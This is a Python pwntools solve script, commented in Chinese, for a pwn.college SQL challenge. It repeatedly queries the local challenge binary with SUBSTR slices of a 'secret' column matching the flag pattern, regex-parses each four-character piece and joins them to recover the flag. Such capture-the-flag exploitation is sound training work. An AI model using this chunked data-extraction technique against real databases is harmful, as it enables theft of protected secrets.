from pwn import *
from functools import singledispatch  
from dataclasses import dataclass
import base64

# 设置架构
context.arch = "amd64"

# 日志的详细输出使用 debug，仅错误使用 error
# context.log_level = "debug"
# context.log_level = "error"

@singledispatch
def connect_tube(target, *args, **kwargs): 
    """
    连接包装器，使用参数1类型派发本地或远程 tube，帮助库型函数
    - 列表，进程
    - 字符串，远程
    """
    ...

@connect_tube.register(list)
def _(argv=["/challenge/run"], *args, **kwargs):
    """进程连接包装器，帮助库型函数"""
    process_tube = process(argv, *args, **kwargs)
    return process_tube

@connect_tube.register(str)
def _(host="127.0.0.1", port=1337, *args, **kwargs):
    """远程连接包装器，帮助库型函数"""
    remote_tube = remote(host, port, *args, **kwargs)
    return remote_tube

def regex_grep_data(origin_data: bytes, re_pattern: re.Pattern, mod="tuple", index=-1, obj=None):
    """
    正则表达式提取示例，帮助库型函数
    - 默认返回按位置匹配的元组列表中的最后一个(-1)
    - 命名捕获组可用元组与字典。元组不会报错，仅丢失命名信息
    参数
    - re_pattern  
        编译的 re 模式，已设置 re 字符串与 flag
    - mod
        - tuple  
            返回元组，主调函数按照位置解包。
            用于简单数据提取
        - dict  
            返回字典，主调函数使用 key 引用或设置到类字段。
            用于复杂数据设置到数据类
    - index
        - 数字：返回列表索引，默认最后一项
        - None: 返回整个列表
    - obj
        - 使用字典解包设置数据类对象
    """

    try:
        match mod:
            case "tuple":
                regex_list = re_pattern.findall(origin_data)
                log.debug(f"tuple {regex_list!r}")

            case "dict":
                regex_iter = re_pattern.finditer(origin_data)
                if obj == None:
                    regex_list = [regex_match.groupdict() for regex_match in regex_iter]
                else:
                    regex_list = [obj(**regex_match.groupdict()) for regex_match in regex_iter]
                log.debug(f"dict {regex_list!r}")

        grep_data = regex_list
        if index != None:
            grep_data = regex_list[index]
            log.debug(grep_data)
    except:
        raise RuntimeError(f"origin_data {origin_data!r}")
    
    return grep_data

def task_main():   
# def task_main():   
    """
    调度主函数，概念型函数
    """
    # 列表数量分界字符串
    enter_delim = b"""sql> """
    
    # b"- {'SUBSTR(secret, 1, 4)': 'pwn.'}\n"
    re_pattern = re.compile(rb"\)': '(?P<flag_sub>.*)'}\n")
    flag_list = []
    for start in range(1, 61, 4):
        cur_tube = connect_tube([challenge])
        query = f"SELECT SUBSTR(secret, {start}, 4) FROM items WHERE secret LIKE 'pwn.college{{%}}'".encode()

        cur_tube.sendlineafter(enter_delim, query)
        
        res = cur_tube.recvrepeat(0.001)
        # b"- {'SUBSTR(secret, 1, 4)': 'pwn.'}\n"
        log.info(f"{res!r}")
        
        grep_data = regex_grep_data(res, re_pattern)
        log.info(grep_data)
        flag_list.append(grep_data)
        cur_tube.close()

    print(b''.join(flag_list))
    # cur_tube = connect_tube([challenge, "qbfq"])
    cur_tube.interactive()
    

challenge = "/challenge/sql"
task_main()